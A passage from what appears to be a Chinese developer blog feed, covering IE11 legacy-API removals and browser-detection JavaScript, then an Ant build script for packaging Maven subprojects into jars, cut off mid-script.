请确保更新依赖于传统功能和文档模式的站点，以便反映现行标准。<br>如果必须针对特定文档模式，以便在重新运行站点来支持现行标准和功能时站点能够工作，则请注意，你使用的是过渡功能，以后的版本中可能不提供该功能。<br>如果你当前针对传统文档模式使用 x-ua-compatible 标头，则你的站点可能无法反映适用于 IE11 的最佳体验。 有关详细信息，请参阅 modern.ie。</p><h2 id="传统-API-添加、更改和删除"><a href="#传统-API-添加、更改和删除" class="headerlink" title="传统 API 添加、更改和删除"></a>传统 API 添加、更改和删除</h2><p>许多网站查找支持传统 (HTML4) 功能的浏览器，目的是提供针对早期浏览器优化的体验。 对于支持传统功能和现行标准（如 HTML5、CSS3 等）的浏览器，这是一个问题。 如果站点在搜索现行标准支持之前检测到传统功能，则可以为支持现行标准的浏览器提供传统体验和更丰富的体验。<br>因此，IE11 添加、更改、删除了许多默认的传统功能：</p><ul><li>navigator.appName 属性现在会返回 “Netscape” 以反映 HTML5 标准和匹配其他浏览器的行为。</li><li>navigator.product 属性现在会返回 “Gecko” 以便反映 HTML5 标准和匹配其他浏览器的行为。</li><li>XDomainRequest 对象被 XMLHttpRequest 的 ORS 替换。</li><li>已添加对 <strong>proto</strong> 的支持。</li><li>已添加 dataset 属性。</li></ul><p>另外，为了支持现行标准指定的功能，已删除若干传统 API 功能：</p><table><thead><tr><th>删除 API 功能</th><th>替代功能</th></tr></thead><tbody><tr><td>attachEvent</td><td>addEventListener</td></tr><tr><td>window.execScript</td><td>eval</td></tr><tr><td>window.doScroll</td><td>window.scrollLeft、window.scrollTop</td></tr><tr><td>document.all</td><td>document.getElementById</td></tr><tr><td>document.fileSize、img.fileSize</td><td>使用 XMLHttpRequest 可提取源</td></tr><tr><td>script.onreadystatechange和script.readyState</td><td>script.onload</td></tr><tr><td>document.selection</td><td>window.getSelection</td></tr><tr><td>document.createStyleSheet</td><td>document.createElement(“style”)</td></tr><tr><td>style.styleSheet</td><td>style.sheet</td></tr><tr><td>window.createPopup</td><td>使用 div 或 iframe（zIndex 值很高）</td></tr><tr><td>二进制行为</td><td>变化:使用基于标准的等效,如 canvas、SVG 或 CSS3 动画</td></tr><tr><td>传统数据绑定</td><td>使用框架提供的数据绑定，如 WinJS</td></tr></tbody></table><p>从IE 4开始，document.all在IE中举足轻重。比起document.getElementById()来说，document.all是IE方式的获取元素的引用的方法。尽管IE 5增加对DOM的支持，但document.all一直沿用至IE 10。<br>而在Internet Explorer 11中document.all并没有真正被删除，尽管使用了document.all的代码实际上还是可以工作,但不推荐使用。</p><p>另外一个要废弃的是attachEvent()方法，该方法用于添加事件处理器，对应的detachEvent()用来移除事件处理器。这两个方法将在Internet Explorer 11中删除。移除这两个方法需要改用如下逻辑：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addEvent</span>(<span class="params">element, type, handler</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(element.attachEvent)&#123;</span><br><span class="line">		element.attachEvent(<span class="string">'on'</span> + type, handler);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(element.addEventListener)&#123;</span><br><span class="line">		element.addEventListener(type, handler, <span class="literal">false</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，建议你优先使用标准的浏览器进行测试以确保不会因为attachEvent()的移除而影响代码执行。不过互联网上充斥着各种糟糕的监测代码，你只能确保自己的应用经过良好的标准测试。</p><p>被删除的特性还包括：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.execScript()	<span class="comment">// IE版本的eval()</span></span><br><span class="line"><span class="built_in">window</span>.doScroll()		<span class="comment">// IE用来滚动窗口的方式</span></span><br><span class="line">script.onreadystatechange()	<span class="comment">// IE脚本加载完成的时间通知方式</span></span><br><span class="line">script.readyState()	<span class="comment">// IE的脚本脚本加载状态</span></span><br><span class="line"><span class="built_in">document</span>.selection()	<span class="comment">// IE获取当前选择文本的方式</span></span><br><span class="line"><span class="built_in">document</span>.createStyleSheetyleSheet()	<span class="comment">// IE创建样式表的方式</span></span><br><span class="line">style.styleSheet()	<span class="comment">// IE引用样式的方式</span></span><br></pre></td></tr></table></figure><p>所有这些被废弃的方法都有基于标准的替代方法。如果你使用的是标准的方法那恭喜你，可直接支持Internet Explorer 11.</p><h2 id="URL-字符编码"><a href="#URL-字符编码" class="headerlink" title="URL 字符编码"></a>URL 字符编码</h2><p>IE11 更改了 URL 的字符编码。 具体来说，现在使用 UTF-8 字符编码对查询字符串和 XHR 请求进行编码。</p><p>此更改会影响所有 URL，但以下除外：</p><ul><li>定位名称组件（也称为“片断”）。</li><li>用户名和密码组件。</li><li>file:// or ftp:// protocol links。</li></ul><p>这些更改与其他浏览器行为匹配并简化了跨浏览器 XHR 代码。</p><h2 id="自定义数据属性"><a href="#自定义数据属性" class="headerlink" title="自定义数据属性"></a>自定义数据属性</h2><p>IE11 添加了对 HTML5 自定义数据属性和 dataset 属性的支持，可以提供对它们的编程访问权限。你可以使用 data- 前缀后跟属性名称的方式来向元素分配数据属性：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-example-data</span>=<span class="string">"Some data here"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>要获取或设置数据属性的值，请使用此语法：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// to get</span></span><br><span class="line"><span class="keyword">var</span> myData = element.dataset.exampleData;</span><br><span class="line"><span class="comment">// to set</span></span><br><span class="line">element.dataset.exampleData = <span class="string">"something new"</span>;</span><br></pre></td></tr></table></figure><h2 id="SVG“pointer-events”属性的-HTML-支持"><a href="#SVG“pointer-events”属性的-HTML-支持" class="headerlink" title="SVG“pointer-events”属性的 HTML 支持"></a>SVG“pointer-events”属性的 HTML 支持</h2><p>从 IE11 开始，也支持 pointer-events 作为 HTML 元素上的 CSS 属性，其效果如下：</p><table><thead><tr><th>值</th><th>描述</th></tr></thead><tbody><tr><td>无</td><td>该元素不会触发指针输入事件（无法进行点击测试）。</td></tr><tr><td>其他有效的指针事件值</td><td>该元素会触发指针输入事件。</td></tr></tbody></table><p>默认情况下将继承 pointer-events 属性，所以会影响应用该属性的元素的所有后代。</p><h2 id="更新反映对基于标准的规范的更改"><a href="#更新反映对基于标准的规范的更改" class="headerlink" title="更新反映对基于标准的规范的更改"></a>更新反映对基于标准的规范的更改</h2><p>IE11 还包括用于支持基于标准的 Web 规范（已更新或仍在发展）的更新。<br>这其中包括与支持下列功能相关的更改：</p><p>弹性框（“Flexbox”）布局更新<br>使用 IE11，你可以更新站点来与最新的弹性框标准保持一致并简化跨浏览器的代码。</p><p>突变观察者<br>突变观察者是 IE11 中新的标准 Web平台功能，提供了对突变事件支持的所有相同方案的快速执行直接替代，以及对属性更改事件支持的方案的替代。</p><h3 id="指针事件"><a href="#指针事件" class="headerlink" title="指针事件"></a>指针事件</h3><p>为了符合万维网联合会 (W3C) 指针事件规范的候选推荐，与 Internet Explorer 10 相比，IE11 实现已略有更改。</p><h2 id="判断浏览器，方法不全"><a href="#判断浏览器，方法不全" class="headerlink" title="判断浏览器，方法不全"></a>判断浏览器，方法不全</h2><h3 id="判断IE兼容到IE9"><a href="#判断IE兼容到IE9" class="headerlink" title="判断IE兼容到IE9"></a>判断IE兼容到IE9</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> _IE = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> v = <span class="number">3</span>, div = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>), all = div.getElementsByTagName(<span class="string">'i'</span>);</span><br><span class="line">    <span class="keyword">while</span> (</span><br><span class="line">        div.innerHTML = <span class="string">'&lt;!--[if gt IE '</span> + (++v) + <span class="string">']&gt;&lt;i&gt;&lt;/i&gt;&lt;![endif]--&gt;'</span>,</span><br><span class="line">        all[<span class="number">0</span>]</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> v &gt; <span class="number">4</span> ? v : <span class="literal">false</span> ;</span><br><span class="line">&#125;());</span><br></pre></td></tr></table></figure><h3 id="判断其他浏览器"><a href="#判断其他浏览器" class="headerlink" title="判断其他浏览器"></a>判断其他浏览器</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//检测函数</span></span><br><span class="line"><span class="keyword">var</span> check = <span class="function"><span class="keyword">function</span>(<span class="params">r</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> r.test(navigator.userAgent.toLowerCase());</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> statics = &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 是否为webkit内核的浏览器</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    isWebkit : <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> check(<span class="regexp">/webkit/</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 是否为火狐浏览器</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    isFirefox : <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> check(<span class="regexp">/firefox/</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 是否为谷歌浏览器</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    isChrome : <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> !statics.isOpera() &amp;&amp; check(<span class="regexp">/chrome/</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 是否为Opera浏览器</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    isOpera : <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> check(<span class="regexp">/opr/</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 检测是否为Safari浏览器</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    isSafari : <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// google chrome浏览器中也包含了safari</span></span><br><span class="line">        <span class="keyword">return</span> !statics.isChrome() &amp;&amp; !statics.isOpera() &amp;&amp; check(<span class="regexp">/safari/</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>IE11</tag>
      </tags>
  </entry>
  <entry>
    <title>使用ant打包maven项目</title>
    <url>/2015/09/17/use-ant-build-maven/</url>
    <content><![CDATA[<p>问题很奇怪，估计没啥雷同的了。<br>简单来说，要求必须用ant打包maven项目。<br>最终只需一个war包，其他项目打成jar包，放在war包中。</p><h2 id="在每个maven子项目中，建立一个用于ant-buildfile的xml。"><a href="#在每个maven子项目中，建立一个用于ant-buildfile的xml。" class="headerlink" title="在每个maven子项目中，建立一个用于ant buildfile的xml。"></a>在每个maven子项目中，建立一个用于ant buildfile的xml。</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 源文件目录 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"src.dir.core"</span> <span class="attr">value</span>=<span class="string">"src/main/java"</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 编译jar文件目录 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"jar.dir.core"</span> <span class="attr">value</span>=<span class="string">"../compile_lib"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"j2eejar.dir.core"</span> <span class="attr">value</span>=<span class="string">"../j2ee_lib"</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- WEB文件目录 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"web.dir.core"</span> <span class="attr">value</span>=<span class="string">"src/main/webapp"</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- config || output address --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"config.dir.core"</span> <span class="attr">value</span>=<span class="string">"src/main/resource"</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- jar文件存放目录 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dist.dir.core"</span> <span class="attr">value</span>=<span class="string">"../compile_lib"</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 编译文件存放目录 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"build.dir.core"</span> <span class="attr">value</span>=<span class="string">"build"</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 生成应用名 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"webapp.name.core"</span> <span class="attr">value</span>=<span class="string">"jar包文件名"</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 编译环境 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">environment</span>=<span class="string">"env"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">path</span> <span class="attr">id</span>=<span class="string">"classpath.core"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">fileset</span> <span class="attr">dir</span>=<span class="string">"$&#123;jar.dir.core&#125;"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">include</span> <span class="attr">name</span>=<span class="string">"*.jar"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">fileset</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">fileset</span> <span class="attr">dir</span>=<span class="string">"$&#123;j2eejar.dir.core&#125;"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">include</span> <span class="attr">name</span>=<span class="string">"*.jar"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">fileset</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">pathelement</span> <span class="attr">path</span>=<span class="string">"$&#123;build.dir.core&#125;"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">target</span> <span class="attr">name</span>=<span class="string">"RUN_PACKAGE"</span> <span class="attr">description</span>=<span class="string">"Packages app as JAR"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">echo</span> <span class="attr">message</span>=<span class="string">"正在清空编译目录，生成目录..."</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">delete</span> <span class="attr">dir</span>=<span class="string">"$&#123;build.dir.core&#125;/classes"</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">delete</span> <span class="attr">file</span>=<span class="string">"$&#123;dist.dir.core&#125;/$&#123;webapp.name.core&#125;.jar"</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">echo</span> <span class="attr">message</span>=<span class="string">"正在创建编译目录...."</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">mkdir</span> <span class="attr">dir</span>=<span class="string">"$&#123;build.dir.core&#125;/classes"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">javac</span> <span class="attr">destdir</span>=<span class="string">"$&#123;build.dir.core&#125;/classes"</span> <span class="attr">debug</span>=<span class="string">"false"</span> <span class="attr">deprecation</span>=<span class="string">"false"</span> <span class="attr">optimize</span>=<span class="string">"true"</span> <span class="attr">failonerror</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">compilerarg</span> <span class="attr">line</span>=<span class="string">"-encoding UTF-8"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">src</span> <span class="attr">path</span>=<span class="string">"$&#123;src.dir.core&#125;"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">classpath</span> <span class="attr">refid</span>=<span class="string">"classpath.core"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">javac</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">echo</span> <span class="attr">message</span>=<span class="string">"正在编译文件目录...."</span>/&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- Copy config files to $&#123;build.dir.core&#125;/classes --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">antcall</span> <span class="attr">target</span>=<span class="string">"DELETE-PAGES"</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">antcall</span> <span class="attr">target</span>=<span class="string">"COPY-PAGER"</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">antcall</span> <span class="attr">target</span>=<span class="string">"COPY-TLD"</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">echo</span> <span class="attr">message</span>=<span class="string">"正在生成JAR包..."</span>/&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 打jar包时，导入哪些配置，不导入哪些配置--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">jar</span> <span class="attr">destfile</span>=<span class="string">"$&#123;dist.dir.core&#125;/$&#123;webapp.name.core&#125;.jar"</span> <span class="attr">basedir</span>=<span class="string">"$&#123;build.dir.core&#125;/classes"</span> &gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">fileset</span> <span class="attr">dir</span>=<span class="string">"$&#123;src.dir.core&#125;"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">include</span> <span class="attr">name</span>=<span class="string">"**/*.properties"</span> /&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">include</span> <span class="attr">name</span>=<span class="string">"**/*.xml"</span> /&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">include</span> <span class="attr">name</span>=<span class="string">"**/*.tld"</span> /&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">include</span> <span class="attr">name</span>=<span class="string">"**/*.ftl"</span> /&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">include</span> <span class="attr">name</span>=<span class="string">"**/*.jasper"</span> /&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">include</span> <span class="attr">name</span>=<span class="string">"**/*.jrxml"</span> /&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">exclude</span> <span class="attr">name</span>=<span class="string">"**/*.java"</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">fileset</span>&gt;</span>	</span><br><span class="line">	<span class="tag">&lt;/<span class="name">jar</span>&gt;</span>	</span><br><span class="line">	<span class="tag">&lt;<span class="name">echo</span> <span class="attr">message</span>=<span class="string">"清理相关编译文件..."</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">delete</span> <span class="attr">dir</span>=<span class="string">"$&#123;build.dir.core&#125;/classes"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--删除指定路径下文件及目录--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">target</span> <span class="attr">name</span>=<span class="string">"DELETE-PAGES"</span> &gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"delete_path_core"</span> <span class="attr">value</span>=<span class="string">"$&#123;build.dir.core&#125;\classes\someproject\"</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">echo</span>&gt;</span>----------------------------------START------------------------------------<span class="tag">&lt;/<span class="name">echo</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">echo</span>&gt;</span>开始删除$&#123;delete_path_core&#125;下文件<span class="tag">&lt;/<span class="name">echo</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">delete</span> <span class="attr">dir</span>=<span class="string">"$&#123;delete_path_core&#125;"</span>/&gt;</span>  </span><br><span class="line">	<span class="tag">&lt;<span class="name">echo</span>&gt;</span>删除完成<span class="tag">&lt;/<span class="name">echo</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">echo</span>&gt;</span>-----------------------------------END-----------------------------------<span class="tag">&lt;/<span class="name">echo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--COPY PAGES到指定路径下--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">target</span> <span class="attr">name</span>=<span class="string">"COPY-PAGER"</span> &gt;</span></span><br><span class="line">	<span class="comment">&lt;!--调用删除--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">antcall</span> <span class="attr">target</span>=<span class="string">"DELETE-PAGES"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"delete_path_core"</span> <span class="attr">value</span>=<span class="string">"$&#123;build.dir.core&#125;\classes\someproject\resource\"</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">antcall</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--webapp 页面路径 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"pager_path_core"</span> <span class="attr">location</span>=<span class="string">"$&#123;web.dir.core&#125;\pages\ylink\someproject\"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"script_path_core"</span> <span class="attr">location</span>=<span class="string">"$&#123;web.dir.core&#125;\script\someproject\"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"style_path_core"</span> <span class="attr">location</span>=<span class="string">"$&#123;web.dir.core&#125;\style\"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"to_pager_path_core"</span> <span class="attr">location</span>=<span class="string">"$&#123;build.dir.core&#125;\classes\someproject\resource\pages"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"to_script_path_core"</span> <span class="attr">location</span>=<span class="string">"$&#123;build.dir.core&#125;\classes\someproject\resource\script\someproject"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"to_style_path_core"</span> <span class="attr">location</span>=<span class="string">"$&#123;build.dir.core&#125;\classes\someproject\resource\style"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">echo</span>&gt;</span>-----------------------------------START-----------------------------------<span class="tag">&lt;/<span class="name">echo</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">echo</span>&gt;</span>($&#123;pager_path_core&#125;)-----------&gt;($&#123;to_pager_path_core&#125;)<span class="tag">&lt;/<span class="name">echo</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">echo</span>&gt;</span>开始拷贝JSP页面<span class="tag">&lt;/<span class="name">echo</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">copy</span> <span class="attr">todir</span>=<span class="string">"$&#123;to_pager_path_core&#125;"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">fileset</span> <span class="attr">dir</span>=<span class="string">"$&#123;pager_path_core&#125;"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">exclude</span> <span class="attr">name</span>=<span class="string">"someproject2/**"</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">fileset</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">copy</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">echo</span>&gt;</span>JSP页面拷贝结束<span class="tag">&lt;/<span class="name">echo</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">echo</span>&gt;</span>开始拷贝scirpt<span class="tag">&lt;/<span class="name">echo</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">copy</span> <span class="attr">todir</span>=<span class="string">"$&#123;to_script_path_core&#125;"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">fileset</span> <span class="attr">dir</span>=<span class="string">"$&#123;script_path_core&#125;"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">include</span> <span class="attr">name</span>=<span class="string">"*/**"</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">fileset</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">copy</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">echo</span>&gt;</span>script脚本拷贝结束<span class="tag">&lt;/<span class="name">echo</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">echo</span>&gt;</span>开始拷贝style<span class="tag">&lt;/<span class="name">echo</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">copy</span> <span class="attr">todir</span>=<span class="string">"$&#123;to_style_path_core&#125;"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">fileset</span> <span class="attr">dir</span>=<span class="string">"$&#123;style_path_core&#125;"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">include</span> <span class="attr">name</span>=<span class="string">"*/**"</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">fileset</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">copy</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">echo</span>&gt;</span>style样式拷贝结束<span class="tag">&lt;/<span class="name">echo</span>&gt;</span>	</span><br><span class="line">	<span class="tag">&lt;<span class="name">echo</span>&gt;</span>开始拷贝resource文件<span class="tag">&lt;/<span class="name">echo</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">copy</span> <span class="attr">todir</span>=<span class="string">"$&#123;build.dir.core&#125;/classes"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">fileset</span> <span class="attr">dir</span>=<span class="string">"$&#123;config.dir.core&#125;"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">include</span> <span class="attr">name</span>=<span class="string">"*/**"</span> /&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">exclude</span> <span class="attr">name</span>=<span class="string">"**/jdbc*.properties"</span> /&gt;</span></span><br><span class="line">		    <span class="tag">&lt;<span class="name">exclude</span> <span class="attr">name</span>=<span class="string">"**/mqconfig*.properties"</span> /&gt;</span></span><br><span class="line">		    <span class="tag">&lt;<span class="name">exclude</span> <span class="attr">name</span>=<span class="string">"**/messages*.properties"</span> /&gt;</span></span><br><span class="line">		    <span class="tag">&lt;<span class="name">exclude</span> <span class="attr">name</span>=<span class="string">"**/system*.properties"</span> /&gt;</span></span><br><span class="line">		    <span class="tag">&lt;<span class="name">exclude</span> <span class="attr">name</span>=<span class="string">"**/cache*.properties"</span> /&gt;</span></span><br><span class="line">		    <span class="tag">&lt;<span class="name">exclude</span> <span class="attr">name</span>=<span class="string">"**/report*.properties"</span> /&gt;</span></span><br><span class="line">		    <span class="tag">&lt;<span class="name">exclude</span> <span class="attr">name</span>=<span class="string">"**/upload*.properties"</span> /&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">exclude</span> <span class="attr">name</span>=<span class="string">"**/webinit-extend*.properties"</span> /&gt;</span></span><br><span class="line">		    <span class="tag">&lt;<span class="name">exclude</span> <span class="attr">name</span>=<span class="string">"**/logback*.xml"</span> /&gt;</span></span><br><span class="line">		    <span class="tag">&lt;<span class="name">exclude</span> <span class="attr">name</span>=<span class="string">"**/struts*.xml"</span> /&gt;</span></span><br><span class="line">		    <span class="tag">&lt;<span class="name">exclude</span> <span class="attr">name</span>=<span class="string">"**/layout*.xml"</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">fileset</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">copy</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">echo</span>&gt;</span>resource文件拷贝结束<span class="tag">&lt;/<span class="name">echo</span>&gt;</span>	</span><br><span class="line">	<span class="tag">&lt;<span class="name">echo</span>&gt;</span>-------------------------------------END---------------------------------<span class="tag">&lt;/<span class="name">echo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--COPY TLD到指定路径下--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">target</span> <span class="attr">name</span>=<span class="string">"COPY-TLD"</span> &gt;</span></span><br><span class="line">	<span class="comment">&lt;!--调用删除--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">antcall</span> <span class="attr">target</span>=<span class="string">"DELETE-PAGES"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"delete_path_core"</span> <span 